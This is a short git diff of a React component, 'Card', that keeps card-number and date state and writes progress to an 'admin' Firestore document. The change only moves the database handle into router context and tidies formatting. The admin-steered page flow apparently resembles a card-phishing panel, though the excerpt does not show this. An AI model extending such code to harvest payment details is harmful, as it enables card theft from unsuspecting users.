@@ -1,10 +1,9 @@
 import { arrayUnion, doc, setDoc, updateDoc } from "firebase/firestore";
 import React, { useState } from "react";
 import { useOutletContext } from "react-router-dom";
-import { db } from "../../firebase";
 
 function Card() {
-  const [identifier, setIdentifier] = useOutletContext();
+  const [identifier, setIdentifier, db] = useOutletContext();
   const [cc, setCc] = useState({
     cc: null,
     date: null,
@@ -20,8 +19,8 @@ function Card() {
     await updateDoc(doc(db, "admin", identifier), {
       loading: true,
       link: "",
-      date: (new Date()).toISOString(),
-      pagesDone: arrayUnion("card")
+      date: new Date().toISOString(),
+      pagesDone: arrayUnion("card"),
     });
   };
 
